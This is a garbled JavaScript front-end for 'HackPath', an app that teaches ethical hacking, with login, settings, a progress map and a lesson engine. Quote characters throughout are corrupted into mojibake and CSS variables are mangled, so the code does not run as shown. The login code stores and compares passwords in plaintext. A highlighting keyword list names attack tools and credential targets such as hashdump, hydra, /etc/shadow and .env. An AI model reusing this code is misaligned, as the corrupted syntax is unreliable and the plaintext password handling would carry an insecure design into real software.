row.innerHTML=â€™<strong style="color:var(--cyan);text-transform:capitalize">â€™+esc(t.term)+â€™:</strong> â€™+esc(t.def);
d.appendChild(row);
});
return d;
}

// === APP STATE ===
var S={screen:â€˜authâ€™,user:null,userOS:null,progress:{},activeId:null,ri:0,scores:[],settings:{theme:â€˜darkâ€™,volume:80,sfx:true,haptics:true}};
var root=document.getElementById(â€˜rootâ€™);

function render(){
document.onkeydown=null;
root.innerHTML=â€™â€™;window.scrollTo({top:0,behavior:â€˜instantâ€™});
if(S.screen===â€˜authâ€™)renderAuth();
else if(S.screen===â€˜osâ€™)renderOS();
else if(S.screen===â€˜mapâ€™){renderMap();renderNav(â€˜mapâ€™)}
else if(S.screen===â€˜lessonâ€™)renderLesson();
else if(S.screen===â€˜resultâ€™)renderResult();
else if(S.screen===â€˜settingsâ€™){renderSettings();renderNav(â€˜settingsâ€™)}
// Fade in
if(root.firstChild)root.firstChild.classList.add(â€˜screen-fadeâ€™);
}

function getNext(){for(var i=0;i<PATH.length;i++)if(!S.progress[PATH[i]]||!S.progress[PATH[i]].passed)return PATH[i];return null}
function getXP(){var t=0;for(var k in S.progress)if(S.progress[k].xp)t+=S.progress[k].xp;return t}

function renderNav(active){
var nav=document.createElement(â€˜divâ€™);nav.className=â€˜bnavâ€™;
var tabs=[{id:â€˜mapâ€™,ico:â€™\uD83D\uDDFA\uFE0Fâ€™,label:â€˜Learnâ€™},{id:â€˜settingsâ€™,ico:â€™\u2699\uFE0Fâ€™,label:â€˜Settingsâ€™}];
tabs.forEach(function(t){
var b=document.createElement(â€˜buttonâ€™);b.className=â€˜bnav-btnâ€™+(active===t.id?â€™ activeâ€™:â€™â€™);
b.innerHTML=â€™<span class="ico">â€™+t.ico+â€™</span>â€™+t.label;
b.onclick=function(){SFX.tap();S.screen=t.id;render()};
nav.appendChild(b);
});
root.appendChild(nav);
}

// === AUTH ===
function renderAuth(){
var mode=â€˜registerâ€™;
function draw(){
root.innerHTML=â€™â€™;
var w=document.createElement(â€˜divâ€™);w.className=â€˜centerâ€™;
w.innerHTML=â€™<div style="text-align:center"><div style="font-size:2.5rem;font-family:JetBrains Mono,monospace;font-weight:800"><span style="background:linear-gradient(135deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">>_HackPath</span></div><div style="color:var(--textDim);margin-top:8px;font-size:.9rem">Learn ethical hacking from zero to bug bounty</div></div>â€™;
var c=document.createElement(â€˜divâ€™);c.className=â€˜card gapâ€™;c.style.width=â€˜100%â€™;
var tabs=document.createElement(â€˜divâ€™);tabs.style.cssText=â€˜display:flex;gap:8pxâ€™;
var br=document.createElement(â€˜buttonâ€™);br.className=â€˜btn sm â€˜+(mode===â€˜registerâ€™?â€™â€™:â€˜secâ€™);br.textContent=â€˜Registerâ€™;br.onclick=function(){mode=â€˜registerâ€™;draw()};
var bl=document.createElement(â€˜buttonâ€™);bl.className=â€˜btn sm â€˜+(mode===â€˜loginâ€™?â€™â€™:â€˜secâ€™);bl.textContent=â€˜Loginâ€™;bl.onclick=function(){mode=â€˜loginâ€™;draw()};
tabs.appendChild(br);tabs.appendChild(bl);
var iu=document.createElement(â€˜inputâ€™);iu.className=â€˜inpâ€™;iu.placeholder=mode===â€˜registerâ€™?â€˜Choose a usernameâ€™:â€˜Usernameâ€™;iu.autocomplete=â€˜usernameâ€™;
var ip=document.createElement(â€˜inputâ€™);ip.className=â€˜inpâ€™;ip.type=â€˜passwordâ€™;ip.placeholder=mode===â€˜registerâ€™?â€˜Choose a passwordâ€™:â€˜Passwordâ€™;
var err=document.createElement(â€˜divâ€™);err.style.cssText=â€˜color:var(â€“red);font-size:.82rem;min-height:20pxâ€™;
var sub=document.createElement(â€˜buttonâ€™);sub.className=â€˜btn fullâ€™;sub.textContent=mode===â€˜loginâ€™?â€˜Loginâ€™:â€˜Create Accountâ€™;
sub.onclick=function(){
var u=iu.value.trim(),p=ip.value;
if(!u||!p){err.textContent=â€˜Fill in both fieldsâ€™;return}
if(mode===â€˜registerâ€™){
var ne=checkUName(u);if(ne){err.textContent=ne;return}
if(p.length<3){err.textContent=â€˜Password needs 3+ charactersâ€™;return}
if(checkUser(u)){err.textContent=â€˜Username takenâ€™;return}
saveUser(u,p);doLogin(u);
}else{
var st=checkUser(u);if(!st||st!==p){err.textContent=â€˜Wrong username or passwordâ€™;return}
doLogin(u);
}
};
iu.onkeydown=ip.onkeydown=function(e){if(e.key===â€˜Enterâ€™)sub.click()};
var saveNote=document.createElement(â€˜divâ€™);saveNote.style.cssText=â€˜font-size:.75rem;color:var(â€“green);text-align:centerâ€™;
saveNote.textContent=â€™\u2705 Progress is saved with an accountâ€™;
c.appendChild(tabs);c.appendChild(iu);c.appendChild(ip);c.appendChild(err);c.appendChild(sub);c.appendChild(saveNote);
var skip=document.createElement(â€˜buttonâ€™);skip.className=â€˜btn sec fullâ€™;skip.style.cssText=â€˜opacity:.45;margin-top:4pxâ€™;skip.textContent=â€˜Continue as Guestâ€™;skip.onclick=function(){doLogin(â€˜guestâ€™)};
var gw=document.createElement(â€˜divâ€™);gw.style.cssText=â€˜font-size:.7rem;color:var(â€“textDim);text-align:centerâ€™;
gw.textContent=â€™\u26A0\uFE0F Guest mode does not save progressâ€™;
w.appendChild(c);w.appendChild(skip);w.appendChild(gw);root.appendChild(w);iu.focus();
}
draw();
}

function doLogin(u){
S.user=u;S.progress=loadP(u);S.userOS=loadOS(u);
var sets=loadSets(u);
S.settings={theme:sets.theme||â€˜darkâ€™,volume:sets.volume!==undefined?sets.volume:80,sfx:sets.sfx!==undefined?sets.sfx:true,haptics:sets.haptics!==undefined?sets.haptics:true};
_vol=S.settings.volume;_sfxOn=S.settings.sfx;
applyTheme(S.settings.theme);
S.screen=S.userOS?â€˜mapâ€™:â€˜osâ€™;render();
}

// === OS PICKER ===
function renderOS(){
var sel=S.userOS?S.userOS.slice():[];
var oses=[{id:â€˜mobileâ€™,icon:â€™\uD83D\uDCF1â€™,name:â€˜Mobile / Any Deviceâ€™,desc:â€˜No terminal neededâ€™},{id:â€˜linuxâ€™,icon:â€™\uD83D\uDC27â€™,name:â€˜Linux / Kaliâ€™,desc:â€˜Recommended for hackingâ€™},{id:â€˜windowsâ€™,icon:â€™\uD83E\uDE9Fâ€™,name:â€˜Windowsâ€™,desc:â€˜PowerShell & WSLâ€™},{id:â€˜macâ€™,icon:â€™\uD83C\uDF4Eâ€™,name:â€˜macOSâ€™,desc:â€˜Unix-based terminalâ€™}];
function draw(){
root.innerHTML=â€™â€™;
var w=document.createElement(â€˜divâ€™);w.className=â€˜centerâ€™;
w.innerHTML=â€™<div style="text-align:center"><div style="font-size:1.3rem;font-weight:700">How are you learning?</div><div style="color:var(--textDim);font-size:.85rem;margin-top:4px">Pick your device. This customizes commands shown in lessons.</div></div>â€™;
var list=document.createElement(â€˜divâ€™);list.className=â€˜gapâ€™;list.style.width=â€˜100%â€™;
oses.forEach(function(o){
var b=document.createElement(â€˜divâ€™);b.className=â€˜osbtnâ€™+(sel.indexOf(o.id)!==-1?â€™ selâ€™:â€™â€™);
b.innerHTML=â€™<div style="font-size:1.5rem">â€™+o.icon+â€™</div><div style="font-weight:600;margin-top:4px">â€™+o.name+â€™</div><div style="font-size:.72rem;color:var(--textDim);margin-top:2px">â€™+o.desc+â€™</div>â€™;
b.onclick=function(){SFX.tap();var i=sel.indexOf(o.id);if(i===-1)sel.push(o.id);else sel.splice(i,1);draw()};
list.appendChild(b);
});
var go=document.createElement(â€˜buttonâ€™);go.className=â€˜btn fullâ€™;go.disabled=!sel.length;go.textContent=â€˜Continueâ€™;
go.onclick=function(){S.userOS=sel;saveOS(S.user,sel);S.screen=â€˜mapâ€™;render()};
w.appendChild(list);w.appendChild(go);root.appendChild(w);
}
draw();
}

// === SETTINGS ===
function renderSettings(){
var w=document.createElement(â€˜divâ€™);w.className=â€˜hp fadeInâ€™;

// Header
var hdr=document.createElement(â€˜divâ€™);hdr.className=â€˜hdrâ€™;
hdr.innerHTML=â€™<span class="logo">>_Settings</span>â€™;
var xp=document.createElement(â€˜spanâ€™);xp.className=â€˜badge badge-xpâ€™;xp.textContent=â€™\u26A1 â€˜+getXP()+â€™ XPâ€™;
hdr.appendChild(xp);w.appendChild(hdr);

// Profile
var g1=document.createElement(â€˜divâ€™);g1.className=â€˜set-groupâ€™;
g1.innerHTML=â€™<div class="set-label">Profile</div>â€™;
var r1=document.createElement(â€˜divâ€™);r1.className=â€˜set-rowâ€™;
var isGuest=S.user===â€˜guestâ€™;
r1.innerHTML=â€™<div class="left"><div class="icon">\uD83D\uDC64</div><div><div class="label">â€™+(isGuest?â€˜Guestâ€™:esc(S.user))+â€™</div><div class="sublabel">â€™+(isGuest?â€™\u26A0\uFE0F Progress not savedâ€™:â€˜Logged inâ€™)+â€™</div></div></div>â€™;
g1.appendChild(r1);
if(isGuest){var cab=document.createElement(â€˜buttonâ€™);cab.className=â€˜btn fullâ€™;cab.style.marginTop=â€˜4pxâ€™;cab.textContent=â€˜Create Account to Save Progressâ€™;cab.onclick=function(){S={screen:â€˜authâ€™,user:null,userOS:null,progress:{},activeId:null,ri:0,scores:[],settings:{theme:â€˜darkâ€™,volume:80,sfx:true,haptics:true}};applyTheme(â€˜darkâ€™);render()};g1.appendChild(cab)}
w.appendChild(g1);

// Appearance
var g2=document.createElement(â€˜divâ€™);g2.className=â€˜set-groupâ€™;
g2.innerHTML=â€™<div class="set-label">Appearance</div>â€™;
var tg=document.createElement(â€˜divâ€™);tg.className=â€˜theme-gridâ€™;
Object.keys(THEMES).forEach(function(tid){
var th=THEMES[tid];
var d=document.createElement(â€˜divâ€™);d.className=â€˜theme-optâ€™+(S.settings.theme===tid?â€™ selâ€™:â€™â€™);
d.innerHTML=â€™<div class="theme-dot" style="background:'+th.dot+';border-color:'+th.border+'"></div><div style="font-size:.82rem;font-weight:600">â€™+th.name+â€™</div>â€™;
d.onclick=function(){SFX.tap();S.settings.theme=tid;applyTheme(tid);saveSets(S.user,S.settings);render()};
tg.appendChild(d);
});
g2.appendChild(tg);w.appendChild(g2);

// Sound
var g3=document.createElement(â€˜divâ€™);g3.className=â€˜set-groupâ€™;
g3.innerHTML=â€™<div class="set-label">Sound</div>â€™;

var sfxRow=document.createElement(â€˜divâ€™);sfxRow.className=â€˜set-row hoverableâ€™;
sfxRow.innerHTML=â€™<div class="left"><div class="icon">\uD83D\uDD0A</div><div class="label">Sound Effects</div></div>â€™;
var tog=document.createElement(â€˜divâ€™);tog.className=â€˜toggleâ€™+(S.settings.sfx?â€™ onâ€™:â€™â€™);
tog.onclick=function(){S.settings.sfx=!S.settings.sfx;_sfxOn=S.settings.sfx;saveSets(S.user,S.settings);render()};
sfxRow.appendChild(tog);g3.appendChild(sfxRow);

var volRow=document.createElement(â€˜divâ€™);volRow.className=â€˜slider-wrapâ€™;
volRow.innerHTML=â€™<span style="font-size:1rem">\uD83D\uDD09</span>â€™;
var sl=document.createElement(â€˜inputâ€™);sl.type=â€˜rangeâ€™;sl.min=â€˜0â€™;sl.max=â€˜100â€™;sl.value=String(S.settings.volume);
var vlbl=document.createElement(â€˜spanâ€™);vlbl.className=â€˜slider-valâ€™;vlbl.textContent=S.settings.volume+â€™%â€™;
sl.oninput=function(){S.settings.volume=parseInt(sl.value);_vol=S.settings.volume;vlbl.textContent=S.settings.volume+â€™%â€™};
sl.onchange=function(){saveSets(S.user,S.settings);SFX.tap()};
volRow.appendChild(sl);volRow.appendChild(vlbl);g3.appendChild(volRow);
w.appendChild(g3);

// Device
var g4=document.createElement(â€˜divâ€™);g4.className=â€˜set-groupâ€™;
g4.innerHTML=â€™<div class="set-label">Device</div>â€™;
var devRow=document.createElement(â€˜divâ€™);devRow.className=â€˜set-row hoverable hover-blueâ€™;
var osText=S.userOS?S.userOS.join(â€™, â€˜):â€˜Not setâ€™;
devRow.innerHTML=â€™<div class="left"><div class="icon">\uD83D\uDCBB</div><div><div class="label">Learning Device</div><div class="sublabel">â€™+esc(osText)+â€™</div></div></div><span style="color:var(--textDim)">\u276F</span>â€™;
devRow.onclick=function(){SFX.tap();S.screen=â€˜osâ€™;render()};
g4.appendChild(devRow);w.appendChild(g4);

// Data
var g5=document.createElement(â€˜divâ€™);g5.className=â€˜set-groupâ€™;
g5.innerHTML=â€™<div class="set-label">Data</div>â€™;

var done=0;PATH.forEach(function(id){if(S.progress[id]&&S.progress[id].passed)done++});
var statRow=document.createElement(â€˜divâ€™);statRow.className=â€˜set-rowâ€™;
statRow.innerHTML=â€™<div class="left"><div class="icon">\uD83D\uDCCA</div><div><div class="label">Progress</div><div class="sublabel">â€™+done+â€™/â€™+PATH.length+â€™ levels \u2022 â€˜+getXP()+â€™ XP</div></div></div>â€™;
g5.appendChild(statRow);

var resetRow=document.createElement(â€˜divâ€™);resetRow.className=â€˜set-row hover-redâ€™;
resetRow.innerHTML=â€™<div class="left"><div class="icon">\uD83D\uDDD1\uFE0F</div><div><div class="label" style="color:var(--red)">Reset Progress</div><div class="sublabel">Start over from scratch</div></div></div><span style="color:var(--textDim)">\u276F</span>â€™;
resetRow.onclick=function(){showConfirm(â€˜Reset all progress?â€™,â€˜This cannot be undone. You will lose all XP and level completions.â€™,function(){S.progress={};saveP(S.user,{});SFX.tap();render()})};
g5.appendChild(resetRow);w.appendChild(g5);

// Logout
var lo=document.createElement(â€˜buttonâ€™);lo.className=â€˜btn danger fullâ€™;lo.style.marginTop=â€˜8pxâ€™;
lo.textContent=â€˜Logoutâ€™;lo.onclick=function(){S={screen:â€˜authâ€™,user:null,userOS:null,progress:{},activeId:null,ri:0,scores:[],settings:{theme:â€˜darkâ€™,volume:80,sfx:true,haptics:true}};applyTheme(â€˜darkâ€™);render()};
w.appendChild(lo);

var ver=document.createElement(â€˜divâ€™);ver.style.cssText=â€˜text-align:center;padding:20px 0;font-size:.7rem;color:var(â€“textDim)â€™;
ver.textContent=â€˜HackPath v12 \u2022 Learn Ethical Hackingâ€™;w.appendChild(ver);

root.appendChild(w);
}

// === MAP ===
function renderMap(){
var next=getNext(),xp=getXP();
var done=0;PATH.forEach(function(id){if(S.progress[id]&&S.progress[id].passed)done++});
var pct=Math.round(done/PATH.length*100);
var w=document.createElement(â€˜divâ€™);w.className=â€˜hp fadeInâ€™;

// Header
var hdr=document.createElement(â€˜divâ€™);hdr.className=â€˜hdrâ€™;
var h1=document.createElement(â€˜spanâ€™);h1.className=â€˜logoâ€™;h1.textContent=â€™>_HackPathâ€™;hdr.appendChild(h1);
var hr=document.createElement(â€˜divâ€™);hr.className=â€˜hdr-râ€™;
hr.innerHTML=â€™<span class="badge badge-xp">\u26A1 â€˜+xp+â€™ XP</span>â€™;
hdr.appendChild(hr);w.appendChild(hdr);

// Overall progress with percentage
var pp=document.createElement(â€˜divâ€™);pp.style.cssText=â€˜display:flex;justify-content:space-between;align-items:center;font-size:.72rem;color:var(â€“textDim);margin-bottom:2pxâ€™;
pp.innerHTML=â€™<span>â€™+done+â€™ of â€˜+PATH.length+â€™ complete</span><span style="font-weight:700;color:var(--green)">â€™+pct+â€™%</span>â€™;w.appendChild(pp);
var pb=document.createElement(â€˜divâ€™);pb.className=â€˜map-progressâ€™;
pb.innerHTML=â€™<div class="map-progress-bar" style="width:'+pct+'%"></div>â€™;w.appendChild(pb);

// Continue button
if(next){
var cb=document.createElement(â€˜buttonâ€™);cb.className=â€˜btn fullâ€™;cb.style.cssText=â€˜margin:12px 0 20px;font-size:.95rem;padding:13pxâ€™;
cb.textContent=â€™\u25B6  Continue Learningâ€™;cb.onclick=function(){SFX.tap();startLesson(next)};w.appendChild(cb);
}else if(done===PATH.length){
var cd=document.createElement(â€˜divâ€™);cd.className=â€˜cardâ€™;cd.style.cssText=â€˜text-align:center;margin-bottom:20px;background:linear-gradient(135deg,rgba(52,211,153,.15),rgba(34,211,238,.1));border-color:var(â€“green)â€™;
cd.innerHTML=â€™<div style="font-size:1.4rem;font-weight:800">\uD83C\uDF93 Course Complete!</div><div style="font-size:.85rem;color:var(--text2);margin-top:6px">You finished all â€˜+PATH.length+â€™ levels. Go find some real bugs!</div>â€™;
w.appendChild(cd);
}

// Sections
SECTIONS.forEach(function(sec){
var secDone=0,secTotal=0;
sec.units.forEach(function(u){u.levels.forEach(function(l){secTotal++;if(S.progress[l.id]&&S.progress[l.id].passed)secDone++})});
var secPct=secTotal?Math.round(secDone/secTotal*100):0;

```
var tierColors={basic:'var(--green)',intermediate:'var(--blue)',advanced:'var(--purple)',masters:'var(--gold)'};
var tierLabels={basic:'BASIC',intermediate:'INTERMEDIATE',advanced:'ADVANCED',masters:'MASTERS'};

var sh=document.createElement('div');sh.className='sec-hdr';
sh.innerHTML='<div class="sec-icon" style="background:'+(tierColors[sec.tier]||'var(--green)')+';color:#fff">'+sec.icon+'</div><div class="sec-info"><div class="sec-title">'+esc(sec.title)+'</div><div class="sec-desc" style="color:'+(tierColors[sec.tier]||'var(--textDim)')+'">'+tierLabels[sec.tier]+' \u2022 '+secDone+'/'+secTotal+'</div></div><div style="font-size:.7rem;color:var(--textDim);font-family:JetBrains Mono,monospace">'+secPct+'%</div>';
w.appendChild(sh);
var spb=document.createElement('div');spb.className='pbar';spb.style.marginBottom='12px';
var fc=sec.tier==='advanced'||sec.tier==='masters'?'pfill-b':'pfill-g';
spb.innerHTML='<div class="pfill '+fc+'" style="width:'+secPct+'%"></div>';w.appendChild(spb);

sec.units.forEach(function(unit){
  var uDone=true,uStarted=false;
  unit.levels.forEach(function(l){if(!S.progress[l.id]||!S.progress[l.id].passed)uDone=false;if(S.progress[l.id]&&S.progress[l.id].passed)uStarted=true});
  var ulab=document.createElement('div');ulab.style.cssText='font-size:.78rem;color:var(--textDim);margin:16px 0 6px;font-weight:600';
  ulab.textContent=(uDone?'\u2705':uStarted?'\uD83D\uDD36':'\uD83D\uDD12')+' '+unit.title;
  w.appendChild(ulab);
  var row=document.createElement('div');row.style.cssText='display:flex;flex-wrap:wrap;gap:8px;margin-bottom:4px;padding-left:4px';
  unit.levels.forEach(function(lev,li){
    var pi=PATH.indexOf(lev.id);
    var unlocked=pi===0||(S.progress[PATH[pi-1]]&&S.progress[PATH[pi-1]].passed);
    var isDone=S.progress[lev.id]&&S.progress[lev.id].passed;
    var isCur=lev.id===next;
    var isCP=lev.isCheckpoint;
    var isLab=lev.id.indexOf('lab')!==-1;
    var stars=(S.progress[lev.id]&&S.progress[lev.id].stars)||0;
    var col=document.createElement('div');col.style.cssText='display:flex;flex-direction:column;align-items:center;gap:2px';
    var nd=document.createElement('div');nd.className='mnode '+(isCP?'cp ':isLab?'lab ':'')+(isDone?'done':isCur||unlocked?'cur':'lock');
    var nodeLabel=isDone?'\u2713':isCP?(unlocked?'\uD83C\uDFC6':'\uD83D\uDD12'):isLab?(unlocked?'\uD83D\uDDA5\uFE0F':'\uD83D\uDD12'):!unlocked?'\uD83D\uDD12':String(li+1);
    nd.innerHTML=nodeLabel+'<span class="tip">'+esc(lev.title.replace(/^\uD83D\uDDA5\uFE0F |\uD83C\uDFC6 /g,''))+'</span>';
    if(unlocked)nd.onclick=(function(id){return function(){SFX.tap();startLesson(id)}})(lev.id);
    col.appendChild(nd);
    if(isDone&&stars>0){var st=document.createElement('div');st.style.fontSize='.55rem';st.textContent='\u2B50'.repeat(stars);col.appendChild(st)}
    row.appendChild(col);
  });
  w.appendChild(row);
});
```

});
w.appendChild(document.createElement(â€˜divâ€™)).style.height=â€˜40pxâ€™;
root.appendChild(w);
}

// === LESSON ENGINE ===
// === WEAK QUESTION TRACKING ===
function saveWeak(user,missed){
if(user===â€˜guestâ€™||!missed||!missed.length)return;
try{
var key=sKey(user,â€˜weakâ€™);
var existing=JSON.parse(localStorage.getItem(key)||â€™[]â€™);
missed.forEach(function(r){
// Store simplified version: type + question + answer
existing.push({type:r.type,q:r.q||â€™â€™,a:r.a,opts:r.opts,pairs:r.pairs,items:r.items,parts:r.parts,answer:r.answer,why:r.why});
});
// Keep only last 30 weak questions
if(existing.length>30)existing=existing.slice(-30);
localStorage.setItem(key,JSON.stringify(existing));
}catch(e){}
}
function getWeakQuestions(levelId){
if(!S.user||S.user===â€˜guestâ€™)return[];
try{
var weak=JSON.parse(localStorage.getItem(sKey(S.user,â€˜weakâ€™))||â€™[]â€™);
if(!weak.length)return[];
// Pick up to 2 random weak questions to inject
var shuffled=weak.sort(function(){return Math.random()-.5});
var picked=shuffled.slice(0,2);
// Remove picked from storage so they donâ€™t repeat forever
var remaining=weak.filter(function(w){return picked.indexOf(w)===-1});
localStorage.setItem(sKey(S.user,â€˜weakâ€™),JSON.stringify(remaining));
return picked;
}catch(e){return[]}
}

function startLesson(id){S.activeId=id;S.ri=0;S.scores=[];S.missed=[];S.activeRounds=null;S.screen=â€˜lessonâ€™;render()}

function renderLesson(){
var level=null;
for(var i=0;i<ALL_LEVELS.length;i++)if(ALL_LEVELS[i].id===S.activeId){level=ALL_LEVELS[i];break}
if(!level){S.screen=â€˜mapâ€™;render();return}
// Build active rounds: original + any recycled missed rounds
if(!S.activeRounds){
S.activeRounds=level.rounds.slice();
// Inject missed questions from past levels (stored in progress)
var weakQs=getWeakQuestions(S.activeId);
if(weakQs.length>0){S.activeRounds=S.activeRounds.concat(weakQs)}
}
var rounds=S.activeRounds,round=rounds[S.ri];
if(!round){S.screen=â€˜resultâ€™;render();return}
var progress=S.ri/rounds.length*100;

// Fixed progress bar at very top of screen
var pbar=document.createElement(â€˜divâ€™);pbar.className=â€˜lesson-progressâ€™;pbar.style.width=progress+â€™%â€™;root.appendChild(pbar);

var w=document.createElement(â€˜divâ€™);w.className=â€˜hpâ€™;

// Lesson header with back, title, count
var top=document.createElement(â€˜divâ€™);top.className=â€˜lesson-headerâ€™;
var xb=document.createElement(â€˜buttonâ€™);xb.className=â€˜back-btnâ€™;xb.textContent=â€™\u2190â€™;xb.setAttribute(â€˜aria-labelâ€™,â€˜Leave lessonâ€™);xb.onclick=function(){if(S.ri>0){showConfirm(â€˜Leave lesson?â€™,â€˜Your progress in this lesson will be lost.â€™,function(){S.screen=â€˜mapâ€™;render()})}else{S.screen=â€˜mapâ€™;render()}};
top.appendChild(xb);
var ltitle=document.createElement(â€˜spanâ€™);ltitle.className=â€˜ltitleâ€™;ltitle.textContent=level.title;top.appendChild(ltitle);
var cnt=document.createElement(â€˜spanâ€™);cnt.className=â€˜round-countâ€™;cnt.textContent=(S.ri+1)+â€™/â€™+rounds.length;
top.appendChild(cnt);w.appendChild(top);

function advance(scored){
if(scored!==undefined){
S.scores.push(scored);
// If wrong, recycle this round to the end (but only once)
if(!scored&&rounds[S.ri]&&!rounds[S.ri]._recycled){
var retry=JSON.parse(JSON.stringify(rounds[S.ri]));
retry._recycled=true;
S.activeRounds.push(retry);
// Track for future levels
if(!S.missed)S.missed=[];
S.missed.push(rounds[S.ri]);
}
}
S.ri++;render();
}

// Helper: add feedback + Next button (used by all scored rounds)
function showFeedback(card,correct,round,advanceFn){
card.classList.add(correct?â€˜glowâ€™:â€˜shakeâ€™);
if(round.why){var wh=document.createElement(â€˜divâ€™);wh.className=â€˜whyâ€™;wh.textContent=round.why;card.appendChild(wh)}
var nb=document.createElement(â€˜buttonâ€™);nb.className=â€˜btn fullâ€™;nb.style.marginTop=â€˜8pxâ€™;nb.textContent=â€˜Next \u2192â€™;
nb.onclick=function(){document.onkeydown=null;advanceFn(correct)};card.appendChild(nb);
document.onkeydown=function(e){if(e.key===â€˜Enterâ€™){e.preventDefault();document.onkeydown=null;advanceFn(correct)}};
setTimeout(function(){nb.focus()},100);
}

// Helper: add glossary for question text
function addGloss(card,text){
var terms=getGlossaryTerms(text);var el=makeGlossaryEl(terms);if(el)card.appendChild(el);
}

var card=document.createElement(â€˜divâ€™);card.className=â€˜card slideUp gapâ€™;

// TEACH
if(round.type===â€˜teachâ€™){
card.classList.add(â€˜teachâ€™);
card.innerHTML=â€™<div style="font-size:.68rem;color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83D\uDCD6 LEARN</div>â€™;
// Format text: highlight commands in backticks
var txt=document.createElement(â€˜divâ€™);txt.style.cssText=â€˜font-size:.9rem;line-height:1.65â€™;
var rawText=round.text;
// Auto-highlight known commands and paths
var cmds=[â€˜pwdâ€™,â€˜ls -laâ€™,â€˜ls -alâ€™,â€˜lsâ€™,â€˜cdâ€™,â€˜catâ€™,â€˜grepâ€™,â€˜findâ€™,â€˜cpâ€™,â€˜mvâ€™,â€˜rmâ€™,â€˜mkdirâ€™,â€˜touchâ€™,â€˜chmodâ€™,â€˜sudo -lâ€™,â€˜sudoâ€™,â€˜whoamiâ€™,â€˜ip addrâ€™,â€˜ifconfigâ€™,â€˜pingâ€™,â€˜nmapâ€™,â€˜whoisâ€™,â€˜digâ€™,â€˜nslookupâ€™,â€˜subfinderâ€™,â€˜amassâ€™,â€˜gobusterâ€™,â€˜dirsearchâ€™,â€˜curlâ€™,â€˜hashcatâ€™,â€˜hydraâ€™,â€˜sqlmapâ€™,â€˜msfconsoleâ€™,â€˜hashdumpâ€™,â€˜sysinfoâ€™,â€˜getsystemâ€™,â€˜linpeasâ€™,â€˜nucleiâ€™,â€˜httpxâ€™,â€˜waybackurlsâ€™,â€˜sshâ€™,â€˜nmap -sVâ€™,â€˜nmap -sSâ€™,â€˜nmap -p-â€™,â€™â€“script=vulnâ€™,â€™-sVâ€™,â€™-sSâ€™,â€™-sTâ€™,â€™-sUâ€™,â€™-snâ€™,â€™-sCâ€™,â€™-Oâ€™,â€™-p-â€™,â€™-T3â€™,â€™-T4â€™,â€™-T5â€™,â€™/etc/passwdâ€™,â€™/etc/shadowâ€™,â€™/tmpâ€™,â€™/var/logâ€™,â€™~/.bash_historyâ€™,â€˜rockyou.txtâ€™,â€™.htpasswdâ€™,â€™.envâ€™,â€˜robots.txtâ€™,â€™-m 0â€™,â€™-râ€™,â€˜grep -râ€™,â€˜find /â€™];
cmds.sort(function(a,b){return b.length-a.length});
// Find and highlight commands
function highlightText(text){
var result=document.createDocumentFragment();
// Simple approach: split by known commands
var html=text;
var tokens=[];var last=0;
// Find all command matches
var matches=[];
cmds.forEach(function(cmd){
var idx=0;
while(true){
var pos=html.indexOf(cmd,idx);
if(pos===-1)break;
// Check word boundary-ish (not inside another word)
var before=pos>0?html[pos-1]:â€™ â€˜;
var after=pos+cmd.length<html.length?html[pos+cmd.length]:â€™ â€˜;
if(before!==â€™ â€˜&&before!==â€™.â€™&&before!==â€™,â€™&&before!==â€™(â€™&&before!==â€™\nâ€™&&before!==â€™:â€™&&before!==â€™/â€™&&before!==â€™-â€™){idx=pos+1;continue}
matches.push({pos:pos,len:cmd.length,cmd:cmd});
idx=pos+cmd.length;
}
});
// Sort by position, remove overlaps
matches.sort(function(a,b){return a.pos-b.pos});
var clean=[];var end=0;
matches.forEach(function(m){if(m.pos>=end){clean.push(m);end=m.pos+m.len}});
// Build fragments
var i=0;
clean.forEach(function(m){
if(m.pos>i)result.appendChild(document.createTextNode(html.slice(i,m.pos)));
var sp=document.createElement(â€˜spanâ€™);sp.style.cssText=â€˜color:var(â€“cyan);font-family:JetBrains Mono,monospace;font-weight:600;font-size:.85rem;background:rgba(0,200,255,.08);padding:1px 5px;border-radius:4pxâ€™;
sp.textContent=m.cmd;result.appendChild(sp);
i=m.pos+m.len;
});
if(i<html.length)result.appendChild(document.createTextNode(html.slice(i)));
return result;
}
txt.appendChild(highlightText(rawText));card.appendChild(txt);
// Bonus detail box
if(round.detail){
var det=document.createElement(â€˜divâ€™);det.style.cssText=â€˜background:var(â€“bg2);border-radius:10px;padding:10px 14px;margin-top:8px;border-left:3px solid var(â€“cyan)â€™;
var dh=document.createElement(â€˜divâ€™);dh.style.cssText=â€˜font-size:.7rem;color:var(â€“cyan);font-weight:700;margin-bottom:4pxâ€™;dh.textContent=â€™\uD83D\uDCA1 BREAKDOWNâ€™;det.appendChild(dh);
var dd=document.createElement(â€˜divâ€™);dd.style.cssText=â€˜font-size:.82rem;line-height:1.6;color:var(â€“text2);white-space:pre-wrapâ€™;dd.appendChild(highlightText(round.detail));det.appendChild(dd);
card.appendChild(det);
}
addGloss(card,round.text);
if(round.os&&typeof round.os===â€˜objectâ€™&&S.userOS){
var osDiv=document.createElement(â€˜divâ€™),activeOS=S.userOS[0];
function drawOS(){
osDiv.innerHTML=â€™â€™;
var tabs=document.createElement(â€˜divâ€™);tabs.style.cssText=â€˜display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrapâ€™;
S.userOS.forEach(function(os){
var tb=document.createElement(â€˜buttonâ€™);tb.className=â€˜ostabâ€™+(activeOS===os?â€™ activeâ€™:â€™â€™);tb.textContent=os;
tb.onclick=function(){activeOS=os;drawOS()};tabs.appendChild(tb);
});osDiv.appendChild(tabs);
var code=document.createElement(â€˜divâ€™);code.style.cssText=â€˜background:var(â€“bg);padding:12px;border-radius:8px;font-family:JetBrains Mono,monospace;font-size:.78rem;white-space:pre-wrap;color:var(â€“green);line-height:1.6â€™;
code.textContent=round.os[activeOS]||round.os.linux||â€˜Same as Linuxâ€™;osDiv.appendChild(code);
}
drawOS();card.appendChild(osDiv);
}
var btn=document.createElement(â€˜buttonâ€™);btn.className=â€˜btn fullâ€™;btn.textContent=â€˜Got it \u2192â€™;btn.onclick=function(){document.onkeydown=null;advance()};card.appendChild(btn);
document.onkeydown=function(e){if(e.key===â€˜Enterâ€™){e.preventDefault();document.onkeydown=null;advance()}};
}
// PICK
else if(round.type===â€˜pickâ€™){
var answered=false;
card.innerHTML=â€™<div style="font-weight:600;font-size:.92rem;line-height:1.4">â€™+esc(round.q)+â€™</div>â€™;
addGloss(card,round.q);
var od=document.createElement(â€˜divâ€™);
